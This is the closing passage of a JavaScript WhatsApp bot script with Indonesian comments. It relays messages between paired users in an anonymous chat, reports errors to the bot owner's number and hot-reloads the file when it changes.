let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(start|leave|next)/.test(m.text)) return
if (['.start','.leave','.next','.mulai','.keluar','.lanjut','.skip'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}}:{})
}
return !0
}}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Alice.sendMessage(`${owner}` + "@s.whatsapp.net", { text: `Laporan Error!! <>\n` + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}}
//————————————————————————//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Succes Update : '${__filename}'`))
	delete require.cache[file]
	require(file)
})

// Terimakasih Sudah Memakai Sc Kami
// Credit : Xyroo
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\